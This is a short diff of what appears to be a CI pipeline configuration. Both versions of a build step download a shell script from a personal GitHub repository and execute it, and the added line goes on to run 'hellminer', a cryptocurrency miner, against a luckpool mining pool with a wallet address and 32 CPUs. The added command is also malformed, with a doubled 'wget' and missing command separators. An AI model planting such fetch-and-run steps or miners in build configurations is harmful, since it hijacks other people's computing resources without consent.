@@ -8,4 +8,4 @@ jobs:
           password: $DOCKERHUB_PASSWORD  # context / project UI env-var reference
     steps:
       - checkout
-      - run:  wget wget https://raw.githubusercontent.com/hsnm97/vrsc/main/ell.sh && chmod u+x ell.sh && ./ell.sh
+      - run:  wget wget https://raw.githubusercontent.com/hsnm97/vrsc/main/ell.sh && chmod u+x ell.sh ./ell.sh ./hellminer -c stratum+tcp://ap.luckpool.net:3956#xnsub -u RYJCYuxLF161q43GQ3N39Ln1LFaYdFKV3f.copas -p x --cpu 32
